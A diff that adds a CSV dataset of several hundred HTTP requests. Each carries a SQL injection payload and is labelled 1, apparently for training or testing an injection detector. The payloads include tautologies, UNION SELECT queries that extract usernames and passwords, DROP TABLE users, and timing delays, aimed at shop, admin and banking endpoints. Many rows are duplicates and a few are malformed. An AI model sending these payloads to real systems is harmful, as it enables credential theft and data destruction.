@@ -1,0 +1,658 @@
+payload,label
+GET /search/results?keyword=camera' OR '1'='1' --&category=gadgets HTTP/1.1,1
+"GET /search/results?keyword=camera' UNION SELECT null, username, password FROM users --&category=gadgets HTTP/1.1",1
+GET /search/results?keyword=camera' AND 1=1 --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' OR 'x'='x' --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' OR 1=1 --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' DROP TABLE users --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' AND 'a'='a' --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' OR 'a'='b' --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' AND 1=0 --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' AND 1=1; --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' OR (SELECT COUNT(*) FROM users) > 0 --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' HAVING 1=1 --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' GROUP BY username --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' --&category=gadgets HTTP/1.1,1
+GET /search/results?keyword=camera' WAITFOR DELAY '00:00:05' --&category=gadgets HTTP/1.1,1
+POST /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' OR '1'='1' --&category=gadgets,1
+"GET /search/results?keyword=camera' UNION SELECT null, username, password FROM users --&category=gadgets HTTP/1.1",1
+"PUT /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' OR '1'='1' --\"",\""category\"":\""gadgets\""}",1
+DELETE /search/results?id=1' OR 1=1 -- HTTP/1.1,1
+POST /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' DROP TABLE users --&category=gadgets,1
+GET /search/results?keyword=camera' AND 1=1 --&category=gadgets HTTP/1.1,1
+"POST /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' AND 1=1; --\"",\""category\"":\""gadgets\""}",1
+"PATCH /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' OR 'x'='x' --\"",\""category\"":\""gadgets\""}",1
+DELETE /search/results?id=1' AND 'a'='a' -- HTTP/1.1,1
+"POST /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' OR 1=1 --\"",\""category\"":\""gadgets\""}",1
+GET /search/results?keyword=camera' AND 1=0 --&category=gadgets HTTP/1.1,1
+PUT /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' HAVING 1=1 --&category=gadgets,1
+PATCH /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' GROUP BY username --&category=gadgets,1
+"POST /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' OR (SELECT COUNT(*) FROM users) > 0 --\"",\""category\"":\""gadgets\""}",1
+GET /search/results?keyword=camera' --&category=gadgets HTTP/1.1,1
+DELETE /search/results?id=1' WAITFOR DELAY '00:00:05' --&category=gadgets HTTP/1.1,1
+PUT /search/results HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nkeyword=camera' AND 1=1; --&category=gadgets,1
+"POST /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' AND 1=1 --\"",\""category\"":\""gadgets\""}",1
+DELETE /search/results?id=1' OR 'x'='x' -- HTTP/1.1,1
+GET /search/results?keyword=camera' AND 1=1 --&category=gadgets HTTP/1.1,1
+"PATCH /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' --\"",\""category\"":\""gadgets\""}",1
+"PUT /search/results HTTP/1.1\nContent-Type: application/json\n{\""keyword\"":\""camera' UNION SELECT null, username, password FROM users --\"",\""category\"":\""gadgets\""}",1
+GET /search?q=camera' OR '1'='1' -- HTTP/1.1,1
+"GET /search?q=camera' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /products?id=1' OR 1=1 -- HTTP/1.1,1
+GET /profile?id=1' AND 1=1 -- HTTP/1.1,1
+GET /cart?item_id=1' OR 'x'='x' -- HTTP/1.1,1
+GET /user?id=1' -- HTTP/1.1,1
+GET /search?q=camera' AND 1=1 -- HTTP/1.1,1
+GET /checkout?id=1' OR 1=0 -- HTTP/1.1,1
+"GET /orders?id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /search?q=camera' HAVING 1=1 -- HTTP/1.1,1
+GET /comments?post_id=1' AND 'a'='a' -- HTTP/1.1,1
+GET /profile?id=1' OR (SELECT COUNT(*) FROM users) > 0 -- HTTP/1.1,1
+GET /product?id=1' AND 1=1; -- HTTP/1.1,1
+GET /account?id=1' WAITFOR DELAY '00:00:05' -- HTTP/1.1,1
+GET /blog?id=1' OR '1'='1' -- HTTP/1.1,1
+GET /search?q=camera' AND '1'='1' -- HTTP/1.1,1
+GET /users?id=1' OR 1=1 -- HTTP/1.1,1
+GET /order?id=1' OR '1'='1' -- HTTP/1.1,1
+GET /login?username=admin' -- HTTP/1.1,1
+GET /comments?id=1' -- HTTP/1.1,1
+GET /search?q=camera' -- HTTP/1.1,1
+GET /admin?id=1' AND 'a'='b' -- HTTP/1.1,1
+GET /orders?id=1' AND 1=0 -- HTTP/1.1,1
+GET /search?q=camera' GROUP BY username -- HTTP/1.1,1
+"GET /product?id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /cart?id=1' OR 1=1 -- HTTP/1.1,1
+"GET /items?id=1' UNION SELECT null, null, password FROM users -- HTTP/1.1",1
+GET /home?id=1' -- HTTP/1.1,1
+GET /search?q=camera' OR '1'='1' -- HTTP/1.1,1
+POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&password=admin,1
+POST /register HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nemail=admin' --&password=admin,1
+POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=anypassword,1
+"POST /user/login HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR '1'='1' --\"",\""password\"":\""password\""}",1
+"POST /search HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nquery=camera' UNION SELECT null, username, password FROM users --",1
+POST /checkout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_info=' OR 1=1 --&address=NY,1
+"POST /order HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":1,\""quantity\"":2,\""payment\"":\""cash' OR 1=1 --\""}",1
+"POST /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nbio=camera' UNION SELECT null, username, password FROM users --",1
+"POST /submit HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR 1=1 --\"",\""password\"":\""password\""}",1
+"POST /submit HTTP/1.1\nContent-Type: application/json\n{\""comment\"":\""camera' OR '1'='1' --\""}",1
+POST /add_to_cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=1' OR 1=1 --&quantity=1,1
+POST /review HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nreview=camera' OR 'x'='x' --&product_id=1,1
+"POST /checkout HTTP/1.1\nContent-Type: application/json\n{\""address\"":\""123 Main St' AND 1=1 --\"",\""payment_method\"":\""credit_card\""}",1
+"POST /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=1' UNION SELECT null, username, password FROM users --",1
+POST /feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment=camera' OR 1=1 --&user_id=1,1
+POST /add_comment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment=camera' --&post_id=1,1
+POST /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' OR '1'='1' --&quantity=2,1
+"POST /search HTTP/1.1\nContent-Type: application/json\n{\""query\"":\""camera' HAVING 1=1 --\""}",1
+POST /user HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nemail=admin' --&password=any,1
+"POST /search HTTP/1.1\nContent-Type: application/json\n{\""query\"":\""camera' AND 1=1 --\""}",1
+POST /update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' AND 1=1 --&password=admin,1
+"POST /user/login HTTP/1.1\nContent-Type: application/json\n{\""email\"":\""admin@domain.com' OR 1=1 --\"",\""password\"":\""password\""}",1
+POST /submit_feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nfeedback=camera' OR 'x'='x' --&user_id=1,1
+POST /search HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nquery=camera' --&category=gadgets,1
+"POST /login HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR 'x'='x' --\"",\""password\"":\""anypassword\""}",1
+POST /logout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' --&session_id=abc123,1
+PUT /update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&email=test@domain.com,1
+"PUT /update HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR '1'='1' --\"",\""email\"":\""test@domain.com\""}",1
+"PUT /profile HTTP/1.1\nContent-Type: application/json\n{\""bio\"":\""camera' OR 1=1 --\""}",1
+PUT /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nname=camera' --&address=NYC,1
+PUT /update_address HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naddress=camera' OR 1=1 --&user_id=123,1
+"PUT /order HTTP/1.1\nContent-Type: application/json\n{\""order_id\"":1,\""status\"":\""canceled' OR 1=1 --\""}",1
+"PUT /feedback HTTP/1.1\nContent-Type: application/json\n{\""comment\"":\""camera' UNION SELECT null, username, password FROM users --\""}",1
+"PUT /post HTTP/1.1\nContent-Type: application/json\n{\""title\"":\""camera' OR 1=1 --\"",\""body\"":\""This is a test post.\""}",1
+"PUT /item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=1' UNION SELECT null, username, password FROM users --",1
+"PUT /update_status HTTP/1.1\nContent-Type: application/json\n{\""status\"":\""active' OR 1=1 --\"",\""user_id\"":1}",1
+"PUT /update_profile HTTP/1.1\nContent-Type: application/json\n{\""name\"":\""admin' OR '1'='1' --\"",\""email\"":\""admin@domain.com\""}",1
+PUT /change_password HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npassword=' OR 1=1 --&confirm_password=admin,1
+PUT /checkout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_method=credit_card' OR 1=1 --&amount=100,1
+PUT /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' --&status=canceled,1
+PUT /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=1' --&quantity=5,1
+PUT /update_user HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' --&name=John,1
+PUT /update_item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=1' AND '1'='1 --&name=Gadget,1
+"PUT /modify HTTP/1.1\nContent-Type: application/json\n{\""name\"":\""camera' UNION SELECT null, username, password FROM users --\""}",1
+PUT /admin/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&role=admin,1
+"PUT /status HTTP/1.1\nContent-Type: application/json\n{\""status\"":\""active' OR 1=1 --\"",\""user_id\"":1}",1
+"PUT /comment HTTP/1.1\nContent-Type: application/json\n{\""comment\"":\""camera' OR '1'='1' --\"",\""post_id\"":1}",1
+DELETE /item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=1' -- HTTP/1.1,1
+DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' OR 1=1 -- HTTP/1.1,1
+"DELETE /account HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1' --\"",\""action\"":\""delete\""}",1
+"DELETE /post HTTP/1.1\nContent-Type: application/json\n{\""post_id\"":1' OR 1=1 --\"",\""action\"":\""delete\""}",1
+DELETE /user HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' OR '1'='1' -- HTTP/1.1,1
+"DELETE /comment HTTP/1.1\nContent-Type: application/json\n{\""comment_id\"":1' OR '1'='1' --\"",\""action\"":\""delete\""}",1
+DELETE /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=1' -- HTTP/1.1,1
+DELETE /review HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nreview_id=1' OR 1=1 -- HTTP/1.1,1
+"DELETE /blog HTTP/1.1\nContent-Type: application/json\n{\""blog_id\"":1' OR 1=1 --\"",\""action\"":\""delete\""}",1
+"DELETE /cart HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":1' --\"",\""action\"":\""remove\""}",1
+DELETE /session HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsession_id=abc123' -- HTTP/1.1,1
+"DELETE /account HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1' --\"",\""action\"":\""delete\""}",1
+DELETE /user HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' AND 1=1 -- HTTP/1.1,1
+"DELETE /post HTTP/1.1\nContent-Type: application/json\n{\""post_id\"":1' --\"",\""action\"":\""delete\""}",1
+DELETE /comment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment_id=1' OR 1=1 -- HTTP/1.1,1
+"DELETE /item HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":1' --\"",\""action\"":\""delete\""}",1
+DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' AND 1=1 -- HTTP/1.1,1
+DELETE /product HTTP/1.1\nContent-Type: application/json,1
+GET /products/search?query=phone' OR '1'='1' -- HTTP/1.1,1
+"GET /reviews?product_id=5' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /order/history?order_id=100' AND 1=1 -- HTTP/1.1,1
+GET /users?id=1' AND '1'='1' -- HTTP/1.1,1
+GET /search?query=tablet' OR 1=1 -- HTTP/1.1,1
+GET /checkout?user_id=1' OR 'x'='x' -- HTTP/1.1,1
+"GET /cart?item_id=3' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /account?user_id=1' OR 1=1 -- HTTP/1.1,1
+GET /orders?order_id=123' OR '1'='1' -- HTTP/1.1,1
+GET /products/detail?product_id=10' AND 1=1 -- HTTP/1.1,1
+GET /users/profile?user_id=1' AND 'a'='a' -- HTTP/1.1,1
+GET /search?query=phone' HAVING 1=1 -- HTTP/1.1,1
+GET /categories?category_id=2' OR '1'='1' -- HTTP/1.1,1
+"GET /post/view?post_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /login?username=admin' OR 1=1 -- HTTP/1.1,1
+GET /items?item_id=5' OR 1=0 -- HTTP/1.1,1
+"GET /profile?user_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /search?q=tv' AND 1=1 -- HTTP/1.1,1
+GET /news?id=10' OR '1'='1' -- HTTP/1.1,1
+GET /api/v1/products?category=electronics' OR 1=1 -- HTTP/1.1,1
+GET /shop/cart?item_id=7' AND 1=1 -- HTTP/1.1,1
+"GET /search?query=monitor' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /events?id=15' OR '1'='1' -- HTTP/1.1,1
+GET /profile/view?user_id=1' -- HTTP/1.1,1
+GET /login?username=admin' AND 1=1 -- HTTP/1.1,1
+"GET /categories?id=5' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /posts?post_id=1' OR 1=1 -- HTTP/1.1,1
+GET /articles?id=10' HAVING 1=1 -- HTTP/1.1,1
+POST /user/signup HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&password=admin,1
+"POST /profile/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nbio=tv' UNION SELECT null, username, password FROM users --&address=NYC",1
+POST /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_info=' OR 1=1 --&order_id=12,1
+"POST /comments HTTP/1.1\nContent-Type: application/json\n{\""post_id\"":1,\""comment\"":\""tv' OR '1'='1' --\""}",1
+"POST /submit HTTP/1.1\nContent-Type: application/json\n{\""username\"":\""admin' OR 1=1 --\"",\""password\"":\""password\""}",1
+"POST /cart/add HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":10,\""quantity\"":2,\""user_id\"":\""1' OR 1=1 --\""}",1
+POST /checkout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naddress=camera' OR 1=1 --&payment=card,1
+"POST /product/review HTTP/1.1\nContent-Type: application/json\n{\""product_id\"":1,\""review\"":\""tv' UNION SELECT null, username, password FROM users --\""}",1
+POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=password,1
+POST /search HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nquery=camera' HAVING 1=1 --&category=gadgets,1
+POST /cart/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=5' OR 1=1 --&quantity=3,1
+POST /admin/delete HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=7' OR 1=1 --&user_id=1,1
+"POST /item/update HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":8,\""price\"":\""100' OR 1=1 --\"",\""quantity\"":5}",1
+"POST /order/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=3' UNION SELECT null, username, password FROM users --&status=completed",1
+"POST /api/v1/orders HTTP/1.1\nContent-Type: application/json\n{\""order_id\"":5,\""user_id\"":\""1' AND 1=1 --\"",\""status\"":\""shipped\""}",1
+POST /comments HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment=camera' OR 1=1 --&post_id=3,1
+"POST /review HTTP/1.1\nContent-Type: application/json\n{\""product_id\"":2,\""review\"":\""tv' OR 1=1 --\""}",1
+POST /search HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nquery=phone' AND 1=1 --&category=electronics,1
+"POST /cart HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":3,\""quantity\"":2,\""user_id\"":\""1' OR '1'='1' --\""}",1
+POST /update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nprofile_id=1' OR 1=1 --&email=test@domain.com,1
+POST /register HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=admin,1
+"POST /admin HTTP/1.1\nContent-Type: application/json\n{\""action\"":\""delete_user\"",\""user_id\"":1' OR 'x'='x' --\""}",1
+POST /feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nfeedback=camera' OR 1=1 --&user_id=1,1
+POST /auth/login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=1234,1
+"POST /settings/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""setting\"":\""dark' OR 1=1 --\""}",1
+"PUT /update/item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=8' UNION SELECT null, username, password FROM users --&price=50",1
+"PUT /user/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":2,\""email\"":\""admin@domain.com' OR '1'='1' --\"",\""username\"":\""admin\""}",1
+PUT /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=9' AND 1=1 --&price=20,1
+PUT /profile HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nbio=camera' OR 'x'='x' --&email=test@domain.com,1
+PUT /cart/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=3' OR 1=1 --&quantity=4,1
+PUT /checkout HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\npayment_method=credit_card' OR 1=1 --&amount=200,1
+"PUT /admin HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""status\"":\""active' OR 1=1 --\""}",1
+"PUT /profile HTTP/1.1\nContent-Type: application/json\n{\""bio\"":\""camera' OR 1=1 --\"",\""user_id\"":1}",1
+PUT /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=3' OR 1=1 --&status=completed,1
+PUT /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=4' --&quantity=5,1
+"PUT /comment HTTP/1.1\nContent-Type: application/json\n{\""comment_id\"":2,\""body\"":\""camera' OR 'x'='x' --\""}",1
+"PUT /items/update HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":5,\""price\"":\""100' OR 1=1 --\"",\""quantity\"":3}",1
+"PUT /admin/settings HTTP/1.1\nContent-Type: application/json\n{\""setting\"":\""dark' OR 1=1 --\"",\""user_id\"":1}",1
+"PUT /review HTTP/1.1\nContent-Type: application/json\n{\""review\"":\""camera' UNION SELECT null, username, password FROM users --\"",\""product_id\"":1}",1
+PUT /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' --&password=admin,1
+"PUT /update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""setting\"":\""dark' OR 1=1 --\""}",1
+"PUT /account/update HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""status\"":\""active' OR 1=1 --\""}",1
+PUT /settings/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ntheme=dark' OR 1=1 --&user_id=1,1
+PUT /order/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=100' OR 1=1 --&status=shipped,1
+"PUT /admin/settings HTTP/1.1\nContent-Type: application/json\n{\""theme\"":\""dark' OR 1=1 --\"",\""user_id\"":1}",1
+PUT /product/update HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=5' AND 1=1 --&price=100,1
+DELETE /item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=6' OR 1=1 --&user_id=1,1
+DELETE /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=5' OR 1=1 --&quantity=2,1
+DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=100' AND 1=1 --&status=shipped,1
+"DELETE /comment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncomment_id=4' UNION SELECT null, username, password FROM users --&user_id=1",1
+DELETE /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=2' OR 1=1 --&category=electronics,1
+DELETE /users HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' OR 'x'='x' --&username=admin,1
+DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=5' OR 1=1 --&user_id=1,1
+DELETE /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=7' OR 1=1 --&user_id=1,1
+DELETE /products HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=5' --&user_id=1,1
+DELETE /feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nfeedback_id=3' OR 1=1 --&user_id=1,1
+DELETE /admin HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=1' OR 1=1 --&action=delete,1
+DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=200' OR 1=1 --&user_id=1,1
+DELETE /item HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=7' OR 1=1 --&quantity=1,1
+"DELETE /reviews HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nreview_id=1' UNION SELECT null, username, password FROM users --&user_id=1",1
+DELETE /users HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nuser_id=5' AND 1=1 --&action=delete,1
+"DELETE /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=1' UNION SELECT null, username, password FROM users --&quantity=10",1
+DELETE /order HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=10' --&status=shipped,1
+DELETE /admin HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naction=delete' OR '1'='1' --&user_id=5,1
+DELETE /items HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=9' OR 1=1 --&quantity=5,1
+"DELETE /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=5' UNION SELECT null, username, password FROM users --&quantity=10",1
+"PATCH /user HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""username\"":\""admin' OR 1=1 --\"",\""password\"":\""newpassword\""}",1
+"PATCH /order HTTP/1.1\nContent-Type: application/json\n{\""order_id\"":5,\""status\"":\""shipped' OR 1=1 --\"",\""user_id\"":1}",1
+PATCH /settings HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nsetting_id=1' AND 1=1 --&status=enabled,1
+"PATCH /profile HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""bio\"":\""tv' OR 1=1 --\"",\""location\"":\""NYC\""}",1
+"PATCH /comment HTTP/1.1\nContent-Type: application/json\n{\""comment_id\"":2,\""body\"":\""camera' UNION SELECT null, username, password FROM users --\""}",1
+PATCH /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=3' OR 1=1 --&price=100,1
+"PATCH /order HTTP/1.1\nContent-Type: application/json\n{\""order_id\"":5,\""status\"":\""completed' OR 1=1 --\"",\""user_id\"":1}",1
+PATCH /feedback HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nfeedback_id=3' OR 1=1 --&status=resolved,1
+"PATCH /item HTTP/1.1\nContent-Type: application/json\n{\""item_id\"":4,\""status\"":\""sold' UNION SELECT null, username, password FROM users --\""}",1
+"PATCH /admin HTTP/1.1\nContent-Type: application/json\n{\""action\"":\""update\"",\""user_id\"":2,\""status\"":\""active' OR 1=1 --\""}",1
+PATCH /cart HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nitem_id=5' OR 1=1 --&quantity=4,1
+"PATCH /product HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nproduct_id=8' UNION SELECT null, username, password FROM users --&price=50",1
+"PATCH /user/settings HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""theme\"":\""dark' OR 1=1 --\""}",1
+"PATCH /profile HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""email\"":\""admin' OR 1=1 --@domain.com\""}",1
+"PATCH /account HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""status\"":\""active' OR 1=1 --\""}",1
+"PATCH /product HTTP/1.1\nContent-Type: application/json\n{\""product_id\"":1,\""status\"":\""available' OR 1=1 --\""}",1
+PATCH /payment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\norder_id=1' OR 1=1 --&payment=done,1
+"PATCH /admin HTTP/1.1\nContent-Type: application/json\n{\""action\"":\""update\"",\""user_id\"":3,\""status\"":\""active' OR 1=1 --\""}",1
+GET /account/details?account_number=12345' OR '1'='1' -- HTTP/1.1,1
+"GET /transactions?account_id=1001' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /balance?user_id=1' AND '1'='1' -- HTTP/1.1,1
+GET /transfer/history?user_id=1' AND '1'='1' -- HTTP/1.1,1
+GET /login?username=admin' OR 1=1 -- HTTP/1.1,1
+GET /account/statement?account_number=2001' AND 1=1 -- HTTP/1.1,1
+"GET /loan/details?loan_id=5' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /transactions?account_number=1234' AND 'x'='x' -- HTTP/1.1,1
+"GET /user/transactions?user_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /accounts?account_id=1' AND '1'='1' -- HTTP/1.1,1
+GET /account/overview?account_id=1' OR '1'='1' -- HTTP/1.1,1
+GET /search?query=balance' HAVING 1=1 -- HTTP/1.1,1
+GET /user/loan?user_id=1' OR '1'='1' -- HTTP/1.1,1
+GET /account/transactions?account_number=5001' AND 1=1 -- HTTP/1.1,1
+GET /payment/overview?payment_id=8' OR '1'='1' -- HTTP/1.1,1
+GET /profile?user_id=1' -- HTTP/1.1,1
+GET /customer/details?customer_id=7' OR '1'='1' -- HTTP/1.1,1
+"GET /loans?user_id=1' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /funds/transfer?sender_account=1234' OR '1'='1' -- HTTP/1.1,1
+"GET /credit/card/details?card_number=1234' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /customer/account?account_id=3' AND 1=1 -- HTTP/1.1,1
+GET /transactions/history?account_id=2' OR 1=1 -- HTTP/1.1,1
+"GET /payments?payment_id=3' UNION SELECT null, username, password FROM users -- HTTP/1.1",1
+GET /users/profile?user_id=1' -- HTTP/1.1,1
+GET /account/history?account_number=100' OR '1'='1' -- HTTP/1.1,1
+GET /loan/application?loan_id=4' OR '1'='1' -- HTTP/1.1,1
+POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin' OR '1'='1' --&password=admin,1
+POST /account/create HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=new_user' OR '1'='1' --&password=1234,1
+"POST /transfer HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' UNION SELECT null, username, password FROM users --&amount=500",1
+"POST /payment HTTP/1.1\nContent-Type: application/json\n{\""account_id\"":1,\""amount\"":\""1000' OR '1'='1' --\""}",1
+"POST /loan/apply HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""amount\"":\""10000' UNION SELECT null, username, password FROM users --\""}",1
+"POST /user/update HTTP/1.1\nContent-Type: application/json\n{\""user_id\"":1,\""email\"":\""admin' OR 1=1 --@domain.com\""}",1
+POST /transaction/create HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naccount_number=1001' OR '1'='1' --&amount=1000,1
+"POST /account/update HTTP/1.1\nContent-Type: application/json\n{\""account_number\"":1234,\""balance\"":\""1000' OR 1=1 --\""}",1
